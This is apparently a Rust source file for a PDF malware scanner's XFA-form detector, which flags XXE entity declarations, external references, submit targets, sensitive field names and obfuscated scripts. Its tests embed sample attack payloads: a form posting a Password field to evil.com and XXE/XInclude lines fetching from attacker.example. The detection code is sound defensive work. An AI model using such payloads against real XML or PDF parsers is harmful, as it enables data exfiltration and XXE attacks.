use anyhow::Result;
use std::collections::{HashMap, HashSet};

use roxmltree::Document;
use sis_pdf_core::detect::{Cost, Detector, Needs};
use sis_pdf_core::evidence::EvidenceBuilder;
use sis_pdf_core::model::{AttackSurface, Confidence, Finding, Impact, Severity};
use sis_pdf_core::scan::ScanContext;
use sis_pdf_core::timeout::TimeoutChecker;
use sis_pdf_pdf::xfa::extract_xfa_script_payloads;

use crate::{entry_dict, uri_classification::analyze_uri_content, xfa_payloads_from_obj};

#[derive(Debug, Clone)]
pub struct XfaFormRecord {
    pub object_ref: String,
    pub ref_chain: String,
    pub payload_index: usize,
    pub size_bytes: usize,
    pub script_count: usize,
    pub submit_urls: Vec<String>,
    pub sensitive_fields: Vec<String>,
    pub script_preview: Option<String>,
    pub has_doctype: bool,
    pub dtd_present: bool,
    pub xml_entity_count: usize,
    pub external_entity_refs: usize,
    pub external_reference_tokens: usize,
}

pub fn collect_xfa_forms(ctx: &ScanContext) -> Vec<XfaFormRecord> {
    let mut records = Vec::new();
    let timeout = TimeoutChecker::new(std::time::Duration::from_millis(100));
    for entry in &ctx.graph.objects {
        if timeout.check().is_err() {
            break;
        }
        let Some(dict) = entry_dict(entry) else {
            continue;
        };
        let Some((_, xfa_obj)) = dict.get_first(b"/XFA") else {
            continue;
        };
        let payloads = xfa_payloads_from_obj(ctx, xfa_obj);
        for (idx, payload) in payloads.iter().enumerate() {
            let stats = inspect_xfa_payload(&payload.bytes);
            let record = XfaFormRecord {
                object_ref: format!("{} {} obj", entry.obj, entry.gen),
                ref_chain: payload.ref_chain.clone(),
                payload_index: idx,
                size_bytes: payload.bytes.len(),
                script_count: stats.script_count,
                submit_urls: stats.submit_urls,
                sensitive_fields: stats.sensitive_fields,
                script_preview: stats.script_preview,
                has_doctype: stats.has_doctype,
                dtd_present: stats.dtd_present,
                xml_entity_count: stats.xml_entity_count,
                external_entity_refs: stats.external_entity_refs,
                external_reference_tokens: stats.external_reference_tokens,
            };
            records.push(record);
        }
    }
    records
}

pub struct XfaFormDetector;

impl Detector for XfaFormDetector {
    fn id(&self) -> &'static str {
        "xfa_forms"
    }

    fn surface(&self) -> AttackSurface {
        AttackSurface::Forms
    }

    fn needs(&self) -> Needs {
        Needs::OBJECT_GRAPH
    }

    fn cost(&self) -> Cost {
        Cost::Cheap
    }

    fn run(&self, ctx: &sis_pdf_core::scan::ScanContext) -> Result<Vec<Finding>> {
        let mut findings = Vec::new();
        let timeout = TimeoutChecker::new(std::time::Duration::from_millis(100));
        for entry in &ctx.graph.objects {
            if timeout.check().is_err() {
                break;
            }
            let Some(dict) = entry_dict(entry) else {
                continue;
            };
            let Some((k, xfa_obj)) = dict.get_first(b"/XFA") else {
                continue;
            };
            let evidence = EvidenceBuilder::new()
                .file_offset(dict.span.start, dict.span.len() as u32, "XFA dict")
                .file_offset(k.span.start, k.span.len() as u32, "Key /XFA")
                .build();

            let payloads = xfa_payloads_from_obj(ctx, xfa_obj);
            for payload in &payloads {
                let stats = inspect_xfa_payload(&payload.bytes);

                if payload.bytes.len() > XFA_MAX_BYTES {
                    let meta = base_xfa_meta(XfaMeta {
                        object_ref: &format!("{} {} obj", entry.obj, entry.gen),
                        ref_chain: &payload.ref_chain,
                        size: payload.bytes.len(),
                        script_count: 0,
                        submit_urls: &[],
                        sensitive_fields: &[],
                        script_preview: None,
                        has_doctype: stats.has_doctype,
                        dtd_present: stats.dtd_present,
                        xml_entity_count: stats.xml_entity_count,
                        external_entity_refs: stats.external_entity_refs,
                        external_reference_tokens: stats.external_reference_tokens,
                    });
                    findings.push(Finding {
                        id: String::new(),
                        surface: self.surface(),
                        kind: "xfa_too_large".into(),
                        severity: Severity::Medium,
                        confidence: Confidence::Probable,
                        impact: Impact::Unknown,
                        title: "XFA content exceeds size limit".into(),
                        description: "XFA content size exceeds the configured threshold.".into(),
                        objects: vec![format!("{} {} obj", entry.obj, entry.gen)],
                        evidence: evidence.clone(),
                        remediation: Some("Review XFA content in a controlled environment.".into()),
                        meta,
                        yara: None,
                        positions: Vec::new(),
                        ..Finding::default()
                    });
                }

                let submit_list = &stats.submit_urls;
                let field_list = &stats.sensitive_fields;
                let base_meta = base_xfa_meta(XfaMeta {
                    object_ref: &format!("{} {} obj", entry.obj, entry.gen),
                    ref_chain: &payload.ref_chain,
                    size: payload.bytes.len(),
                    script_count: stats.script_count,
                    submit_urls: submit_list,
                    sensitive_fields: field_list,
                    script_preview: stats.script_preview.as_deref(),
                    has_doctype: stats.has_doctype,
                    dtd_present: stats.dtd_present,
                    xml_entity_count: stats.xml_entity_count,
                    external_entity_refs: stats.external_entity_refs,
                    external_reference_tokens: stats.external_reference_tokens,
                });

                if stats.has_doctype
                    || stats.dtd_present
                    || stats.xml_entity_count > 0
                    || stats.external_reference_tokens > 0
                {
                    let mut meta = base_meta.clone();
                    let ingest_risk = derive_backend_ingest_risk(&stats);
                    meta.insert("backend.ingest_risk".into(), ingest_risk.into());
                    findings.push(Finding {
                        id: String::new(),
                        surface: self.surface(),
                        kind: "xfa_entity_resolution_risk".into(),
                        severity: if ingest_risk == "high" {
                            Severity::High
                        } else if ingest_risk == "medium" {
                            Severity::Medium
                        } else {
                            Severity::Low
                        },
                        confidence: if ingest_risk == "high" {
                            Confidence::Strong
                        } else if stats.has_doctype || stats.external_reference_tokens > 0 {
                            Confidence::Strong
                        } else {
                            Confidence::Probable
                        },
                        impact: if ingest_risk == "high" {
                            Impact::High
                        } else if ingest_risk == "medium" {
                            Impact::Medium
                        } else {
                            Impact::Low
                        },
                        title: "XFA XML entity-resolution risk".into(),
                        description: "XFA payload includes XML DTD/entity or external-reference constructs that can increase backend ingest risk when parser hardening is not enforced.".into(),
                        objects: vec![format!("{} {} obj", entry.obj, entry.gen)],
                        evidence: evidence.clone(),
                        remediation: Some("Disable XML DTD processing and external entity resolution; block external schema/include resolution in all backend XFA/XML ingestion pipelines.".into()),
                        meta,
                        yara: None,
                        positions: Vec::new(),
                        ..Finding::default()
                    });
                }

                if stats.external_entity_refs > 0 {
                    let mut meta = base_meta.clone();
                    meta.insert("backend.ingest_risk".into(), "high".into());
                    findings.push(Finding {
                        id: String::new(),
                        surface: self.surface(),
                        kind: "xfa_backend_xxe_pattern".into(),
                        severity: Severity::High,
                        confidence: Confidence::Strong,
                        impact: Impact::High,
                        title: "XFA backend XXE pattern".into(),
                        description: "XFA payload contains external XML entity declarations consistent with backend XXE-style ingestion risk patterns.".into(),
                        objects: vec![format!("{} {} obj", entry.obj, entry.gen)],
                        evidence: evidence.clone(),
                        remediation: Some("Treat as high-risk for backend ingest paths and enforce strict parser hardening (no DTD, no external entities).".into()),
                        meta,
                        yara: None,
                        positions: Vec::new(),
                        ..Finding::default()
                    });
                }

                if stats.has_doctype {
                    continue;
                }

                for url in submit_list.iter().take(XFA_SUBMIT_URL_LIMIT) {
                    let mut meta = base_meta.clone();
                    meta.insert("xfa.submit.url".into(), url.clone());
                    meta.insert("url".into(), url.clone());
                    let analysis = analyze_uri_content(url.as_bytes());
                    if let Some(domain) = analysis.domain.as_ref() {
                        meta.insert("url.domain".into(), domain.clone());
                    }
                    meta.insert("url.scheme".into(), analysis.scheme.clone());
                    meta.insert("url.is_http".into(), analysis.is_http.to_string());
                    meta.insert("url.is_ip_address".into(), analysis.is_ip_address.to_string());
                    meta.insert(
                        "url.userinfo_present".into(),
                        analysis.userinfo_present.to_string(),
                    );
                    let is_external = analysis
                        .domain
                        .as_ref()
                        .map(|d| !matches!(d.as_str(), "localhost" | "127.0.0.1" | "::1"))
                        .unwrap_or(true);
                    meta.insert("url.external".into(), is_external.to_string());
                    findings.push(Finding {
                        id: String::new(),
                        surface: self.surface(),
                        kind: "xfa_submit".into(),
                        severity: Severity::Medium,
                        confidence: Confidence::Probable,
                        impact: Impact::Unknown,
                        title: "XFA submit action present".into(),
                        description: format!(
                            "XFA submit target {} (scheme={}, domain={}, external={}).",
                            url,
                            analysis.scheme,
                            analysis.domain.unwrap_or_else(|| "unknown".into()),
                            is_external
                        ),
                        objects: vec![format!("{} {} obj", entry.obj, entry.gen)],
                        evidence: evidence.clone(),
                        remediation: Some(
                            "Validate submit destination trust boundary and audit which fields are transmitted."
                                .into(),
                        ),
                        meta,
                        yara: None,
                        positions: Vec::new(),
                        ..Finding::default()
                    });
                }

                for name in field_list.iter().take(XFA_FIELD_NAME_LIMIT) {
                    let mut meta = base_meta.clone();
                    meta.insert("xfa.field.name".into(), name.clone());
                    meta.insert("field".into(), name.clone());
                    findings.push(Finding {
                        id: String::new(),
                        surface: self.surface(),
                        kind: "xfa_sensitive_field".into(),
                        severity: Severity::Low,
                        confidence: Confidence::Probable,
                        impact: Impact::Unknown,
                        title: "XFA sensitive field present".into(),
                        description: "XFA form contains a sensitive field name.".into(),
                        objects: vec![format!("{} {} obj", entry.obj, entry.gen)],
                        evidence: evidence.clone(),
                        remediation: Some("Inspect field bindings and data handling.".into()),
                        meta,
                        yara: None,
                        positions: Vec::new(),
                        ..Finding::default()
                    });
                }

                if stats.script_count > XFA_SCRIPT_COUNT_HIGH {
                    let meta = base_meta.clone();
                    findings.push(Finding {
                        id: String::new(),
                        surface: self.surface(),
                        kind: "xfa_script_count_high".into(),
                        severity: Severity::Medium,
                        confidence: Confidence::Probable,
                        impact: Impact::Unknown,
                        title: "XFA script count high".into(),
                        description: "XFA contains an unusually high number of script blocks."
                            .into(),
                        objects: vec![format!("{} {} obj", entry.obj, entry.gen)],
                        evidence: evidence.clone(),
                        remediation: Some("Inspect XFA scripts for malicious behaviour.".into()),
                        meta,
                        yara: None,
                        positions: Vec::new(),
                        ..Finding::default()
                    });
                }

                // Deep mode: forward XFA script payloads through static JS analysis.
                if ctx.options.deep && stats.script_count > 0 {
                    for script in extract_xfa_script_payloads(&payload.bytes)
                        .iter()
                        .take(XFA_JS_ANALYSIS_LIMIT)
                    {
                        let signals = js_analysis::static_analysis::extract_js_signals(script);
                        let has_eval = signals.get("js.contains_eval").is_some_and(|v| v == "true")
                            || signals
                                .get("js.dynamic_eval_construction")
                                .is_some_and(|v| v == "true");
                        let has_obfuscation =
                            signals.get("js.jsfuck_encoding").is_some_and(|v| v == "true")
                                || signals.get("js.jjencode_encoding").is_some_and(|v| v == "true")
                                || signals.get("js.aaencode_encoding").is_some_and(|v| v == "true");

                        if has_eval {
                            let mut meta = base_meta.clone();
                            for (k, v) in &signals {
                                if v == "true" {
                                    meta.insert(format!("xfa_js.{k}"), v.clone());
                                }
                            }
                            findings.push(Finding {
                                id: String::new(),
                                surface: self.surface(),
                                kind: "xfa_js.eval_detected".into(),
                                severity: Severity::High,
                                confidence: Confidence::Strong,
                                impact: Impact::Unknown,
                                title: "XFA script contains eval() or dynamic code construction"
                                    .into(),
                                description: "XFA script payload contains eval() or equivalent dynamic code execution pattern that may be used to obscure and execute malicious code.".into(),
                                objects: vec![format!("{} {} obj", entry.obj, entry.gen)],
                                evidence: evidence.clone(),
                                remediation: Some(
                                    "Inspect XFA script for obfuscated payload; treat as active code execution risk.".into(),
                                ),
                                meta,
                                yara: None,
                                positions: Vec::new(),
                                ..Finding::default()
                            });
                        }

                        if has_obfuscation {
                            let mut meta = base_meta.clone();
                            for (k, v) in &signals {
                                if v == "true" {
                                    meta.insert(format!("xfa_js.{k}"), v.clone());
                                }
                            }
                            findings.push(Finding {
                                id: String::new(),
                                surface: self.surface(),
                                kind: "xfa_js.obfuscated".into(),
                                severity: Severity::High,
                                confidence: Confidence::Strong,
                                impact: Impact::Unknown,
                                title: "XFA script uses known JavaScript encoding obfuscation"
                                    .into(),
                                description: "XFA script payload uses JSFuck, JJEncode, or AAEncode encoding to conceal its true behaviour.".into(),
                                objects: vec![format!("{} {} obj", entry.obj, entry.gen)],
                                evidence: evidence.clone(),
                                remediation: Some(
                                    "Decode the XFA script and inspect the underlying payload.".into(),
                                ),
                                meta,
                                yara: None,
                                positions: Vec::new(),
                                ..Finding::default()
                            });
                        }
                    }
                }
            }
        }
        Ok(findings)
    }
}

const XFA_MAX_BYTES: usize = 1024 * 1024;
const XFA_SCRIPT_COUNT_HIGH: usize = 5;
const XFA_JS_ANALYSIS_LIMIT: usize = 3;
const XFA_SUBMIT_URL_LIMIT: usize = 5;
const XFA_FIELD_NAME_LIMIT: usize = 20;
const XFA_EXECUTE_TAG_LIMIT: usize = 50;
const XFA_SCRIPT_PREVIEW_LEN: usize = 120;

fn has_doctype(input: &str) -> bool {
    input.contains("<!doctype")
}

fn find_submit_urls(input: &str, limit: usize) -> Vec<String> {
    let mut out = Vec::new();
    for tag in find_tag_blocks(input, "submit", limit) {
        if let Some(url) = extract_attr_value(&tag, "url") {
            out.push(url);
        } else if let Some(url) = extract_attr_value(&tag, "target") {
            out.push(url);
        }
    }
    out
}

fn find_field_names(input: &str, limit: usize) -> Vec<String> {
    let mut out = Vec::new();
    for tag in find_tag_blocks(input, "field", limit) {
        if let Some(name) = extract_attr_value(&tag, "name") {
            out.push(name);
        }
    }
    out
}

fn find_tag_blocks(input: &str, tag: &str, limit: usize) -> Vec<String> {
    let mut out = Vec::new();
    let needle = format!("<{}", tag);
    let mut idx = 0usize;
    while let Some(pos) = input[idx..].find(&needle) {
        let start = idx + pos;
        let Some(end) = input[start..].find('>') else {
            break;
        };
        let tag_block = &input[start..start + end + 1];
        out.push(tag_block.to_string());
        idx = start + end + 1;
        if out.len() >= limit {
            break;
        }
    }
    out
}

fn count_execute_tags(input: &str, limit: usize) -> usize {
    let mut count = find_tag_blocks(input, "execute", limit).len();
    if count < limit {
        count += find_tag_blocks(input, "xfa:execute", limit - count).len();
    }
    count
}

struct XfaPayloadStats {
    script_count: usize,
    submit_urls: Vec<String>,
    sensitive_fields: Vec<String>,
    script_preview: Option<String>,
    has_doctype: bool,
    dtd_present: bool,
    xml_entity_count: usize,
    external_entity_refs: usize,
    external_reference_tokens: usize,
}

fn inspect_xfa_payload(payload: &[u8]) -> XfaPayloadStats {
    let decoded = String::from_utf8_lossy(payload);
    let lower = decoded.to_ascii_lowercase();
    let has_doctype = has_doctype(&lower);
    let dtd_present = has_doctype || lower.contains("<!dtd");
    let xml_entity_count = count_xml_entity_declarations(&lower);
    let external_entity_refs = count_external_xml_entities(&lower);
    let external_reference_tokens = count_external_reference_tokens(&lower);
    let mut script_count = 0usize;
    let mut submit_urls = HashSet::new();
    let mut sensitive_fields = HashSet::new();
    let mut script_preview = None;

    if !has_doctype {
        if let Ok(doc) = Document::parse(&decoded) {
            gather_xfa_doc_info(
                &doc,
                &mut script_count,
                &mut submit_urls,
                &mut sensitive_fields,
                &mut script_preview,
            );
        }

        if script_count == 0 {
            script_count += extract_xfa_script_payloads(payload).len();
            script_count += count_execute_tags(&lower, XFA_EXECUTE_TAG_LIMIT);
        }
    } else {
        // Do not attempt further analysis when DOCTYPE is present.
    }

    if script_preview.is_none() {
        script_count += extract_xfa_script_payloads(payload).len();
        script_count += count_execute_tags(&lower, XFA_EXECUTE_TAG_LIMIT);
    }

    if script_preview.is_none() && !has_doctype {
        if let Some(script) = extract_xfa_script_payloads(payload).first() {
            let preview = String::from_utf8_lossy(script);
            let preview = preview_text(&preview, XFA_SCRIPT_PREVIEW_LEN);
            if !preview.is_empty() {
                script_preview = Some(preview);
            }
        }
    }

    if !has_doctype {
        for url in find_submit_urls(&lower, XFA_SUBMIT_URL_LIMIT) {
            insert_limited(&mut submit_urls, url, XFA_SUBMIT_URL_LIMIT);
        }
        for name in find_field_names(&lower, XFA_FIELD_NAME_LIMIT) {
            if is_sensitive_field(&name) {
                insert_limited(&mut sensitive_fields, name, XFA_FIELD_NAME_LIMIT);
            }
        }
    }

    XfaPayloadStats {
        script_count,
        submit_urls: sorted_strings(&submit_urls),
        sensitive_fields: sorted_strings(&sensitive_fields),
        script_preview,
        has_doctype,
        dtd_present,
        xml_entity_count,
        external_entity_refs,
        external_reference_tokens,
    }
}

fn count_xml_entity_declarations(input: &str) -> usize {
    input.match_indices("<!entity").count()
}

fn count_external_xml_entities(input: &str) -> usize {
    let mut count = 0usize;
    let mut idx = 0usize;
    while let Some(pos) = input[idx..].find("<!entity") {
        let start = idx + pos;
        let Some(end_rel) = input[start..].find('>') else {
            break;
        };
        let segment = &input[start..start + end_rel + 1];
        if segment.contains(" system ") || segment.contains(" public ") {
            count += 1;
        }
        idx = start + end_rel + 1;
    }
    count
}

fn count_external_reference_tokens(input: &str) -> usize {
    let mut count = 0usize;
    count += input.match_indices("xsi:schemalocation=").count();
    count += input.match_indices("<xi:include").count();
    count += input.match_indices("<xinclude:include").count();
    count += input.match_indices("href=\"http://").count();
    count += input.match_indices("href=\"https://").count();
    count += input.match_indices("href=\"file://").count();
    count += input.match_indices("href=\"smb://").count();
    count
}

fn extract_attr_value(tag: &str, attr: &str) -> Option<String> {
    let needle = format!("{}=", attr);
    let pos = tag.find(&needle)?;
    let rest = &tag[pos + needle.len()..];
    let rest = rest.trim_start();
    let quote = rest.chars().next()?;
    let rest = rest.trim_start_matches(quote);
    let end = rest.find(quote)?;
    Some(rest[..end].to_string())
}

fn is_sensitive_field(name: &str) -> bool {
    let lower = name.to_ascii_lowercase();
    ["password", "passwd", "ssn", "credit", "card", "cvv", "pin"]
        .iter()
        .any(|needle| lower.contains(needle))
}

fn gather_xfa_doc_info(
    doc: &Document,
    script_count: &mut usize,
    submit_urls: &mut HashSet<String>,
    sensitive_fields: &mut HashSet<String>,
    script_preview: &mut Option<String>,
) {
    const SCRIPT_TAGS: &[&str] = &["script", "xfa:script"];
    const EXECUTE_TAGS: &[&str] = &["execute", "xfa:execute"];
    const SUBMIT_TAGS: &[&str] = &["submit", "xfa:submit"];
    const FIELD_TAGS: &[&str] = &["field", "xfa:field"];

    for node in doc.descendants() {
        if !node.is_element() {
            continue;
        }
        let name = node.tag_name().name();
        if tag_matches(name, SCRIPT_TAGS) {
            *script_count += 1;
            if script_preview.is_none() {
                if let Some(text) = node.text() {
                    let preview = preview_text(text, XFA_SCRIPT_PREVIEW_LEN);
                    if !preview.is_empty() {
                        script_preview.replace(preview);
                    }
                }
            }
        } else if tag_matches(name, EXECUTE_TAGS) {
            *script_count += 1;
        }

        if tag_matches(name, SUBMIT_TAGS) && submit_urls.len() < XFA_SUBMIT_URL_LIMIT {
            if let Some(url) = attribute_ci(&node, "url").or_else(|| attribute_ci(&node, "target"))
            {
                insert_limited(submit_urls, url, XFA_SUBMIT_URL_LIMIT);
            }
        }

        if tag_matches(name, FIELD_TAGS) && sensitive_fields.len() < XFA_FIELD_NAME_LIMIT {
            if let Some(name_attr) = attribute_ci(&node, "name") {
                if is_sensitive_field(&name_attr) {
                    insert_limited(sensitive_fields, name_attr, XFA_FIELD_NAME_LIMIT);
                }
            }
        }
    }
}

fn tag_matches(name: &str, candidates: &[&str]) -> bool {
    candidates.iter().any(|candidate| name.eq_ignore_ascii_case(candidate))
}

fn attribute_ci(node: &roxmltree::Node, name: &str) -> Option<String> {
    for attr in node.attributes() {
        if attr.name().eq_ignore_ascii_case(name) {
            return Some(attr.value().to_string());
        }
    }
    None
}

fn insert_limited(set: &mut HashSet<String>, value: String, limit: usize) {
    if set.len() < limit {
        set.insert(value);
    }
}

fn sorted_strings(set: &HashSet<String>) -> Vec<String> {
    let mut values: Vec<String> = set.iter().cloned().collect();
    values.sort();
    values
}

struct XfaMeta<'a> {
    object_ref: &'a str,
    ref_chain: &'a str,
    size: usize,
    script_count: usize,
    submit_urls: &'a [String],
    sensitive_fields: &'a [String],
    script_preview: Option<&'a str>,
    has_doctype: bool,
    dtd_present: bool,
    xml_entity_count: usize,
    external_entity_refs: usize,
    external_reference_tokens: usize,
}

fn base_xfa_meta(meta_config: XfaMeta<'_>) -> HashMap<String, String> {
    let XfaMeta {
        object_ref,
        ref_chain,
        size,
        script_count,
        submit_urls,
        sensitive_fields,
        script_preview,
        has_doctype,
        dtd_present,
        xml_entity_count,
        external_entity_refs,
        external_reference_tokens,
    } = meta_config;
    let mut meta = HashMap::new();
    meta.insert("xfa.size_bytes".into(), size.to_string());
    meta.insert("xfa.script_count".into(), script_count.to_string());
    if !submit_urls.is_empty() {
        meta.insert("xfa.submit_urls".into(), encode_array(submit_urls));
    }
    if !sensitive_fields.is_empty() {
        meta.insert("xfa.sensitive_fields".into(), encode_array(sensitive_fields));
    }
    if let Some(preview) = script_preview {
        meta.insert("xfa.script.preview".into(), preview.to_string());
    }
    meta.insert("xfa.object".into(), object_ref.to_string());
    meta.insert("xfa.ref_chain".into(), ref_chain.to_string());
    meta.insert("xfa.has_doctype".into(), has_doctype.to_string());
    meta.insert("xfa.dtd_present".into(), dtd_present.to_string());
    meta.insert("xfa.entity_keyword_count".into(), xml_entity_count.to_string());
    meta.insert("xfa.xml_entity_count".into(), xml_entity_count.to_string());
    meta.insert("xfa.external_entity_refs".into(), external_entity_refs.to_string());
    meta.insert("xfa.external_reference_tokens".into(), external_reference_tokens.to_string());
    meta
}

fn derive_backend_ingest_risk(stats: &XfaPayloadStats) -> &'static str {
    if stats.external_entity_refs > 0 {
        "high"
    } else if stats.has_doctype || stats.dtd_present || stats.external_reference_tokens > 0 {
        "medium"
    } else if stats.xml_entity_count > 0 {
        "low"
    } else {
        "low"
    }
}

fn encode_array(values: &[String]) -> String {
    let escaped: Vec<String> = values
        .iter()
        .map(|value| format!("\"{}\"", value.replace('\\', "\\\\").replace('"', "\\\"")))
        .collect();
    format!("[{}]", escaped.join(","))
}

fn preview_text(text: &str, max_len: usize) -> String {
    let normalized = text.trim().replace(['\n', '\r'], " ");
    if normalized.len() <= max_len {
        normalized
    } else {
        format!("{}...", &normalized[..max_len])
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_parse_simple_xfa() {
        let payload = br#"<?xml version="1.0"?>
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
  <template xmlns="http://www.xfa.org/schema/xfa-template/2.5/">
    <subform></subform>
  </template>
</xdp:xdp>"#;

        let stats = inspect_xfa_payload(payload);
        assert_eq!(stats.script_count, 0);
        assert!(stats.submit_urls.is_empty());
        assert!(stats.sensitive_fields.is_empty());
        assert!(!stats.has_doctype);
        assert!(stats.script_preview.is_none());
    }

    #[test]
    fn test_detect_xfa_script_submit_and_sensitive_field() {
        let payload = br#"<?xml version="1.0"?>
<xfa:form xmlns:xfa="http://ns.adobe.com/xdp/">
  <script>app.alert('hi');</script>
  <submit target="https://evil.com/submit"/>
  <field name="Password"/>
</xfa:form>"#;

        let stats = inspect_xfa_payload(payload);
        assert!(stats.script_count >= 1);
        assert_eq!(stats.submit_urls, vec!["https://evil.com/submit".to_string()]);
        assert!(stats.sensitive_fields.iter().any(|value| value.eq_ignore_ascii_case("Password")));
        assert!(stats
            .script_preview
            .as_deref()
            .map(|value| value.contains("alert"))
            .unwrap_or(false));
    }

    #[test]
    fn test_detect_external_entity_patterns() {
        let payload = br#"<?xml version="1.0"?>
<!DOCTYPE xfa [ <!ENTITY ext SYSTEM "http://attacker.example/payload.dtd"> ]>
<xfa:form xmlns:xfa="http://ns.adobe.com/xdp/">
  <field name="Password"/>
</xfa:form>"#;
        let stats = inspect_xfa_payload(payload);
        assert!(stats.has_doctype);
        assert!(stats.dtd_present);
        assert_eq!(stats.xml_entity_count, 1);
        assert_eq!(stats.external_entity_refs, 1);
    }

    #[test]
    fn test_detect_external_reference_tokens() {
        let payload = br#"<?xml version="1.0"?>
<xfa:form xmlns:xfa="http://ns.adobe.com/xdp/" xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="https://attacker.example/schema.xsd"/>
</xfa:form>"#;
        let stats = inspect_xfa_payload(payload);
        assert!(!stats.has_doctype);
        assert_eq!(stats.xml_entity_count, 0);
        assert_eq!(stats.external_entity_refs, 0);
        assert!(stats.external_reference_tokens > 0);
    }
}
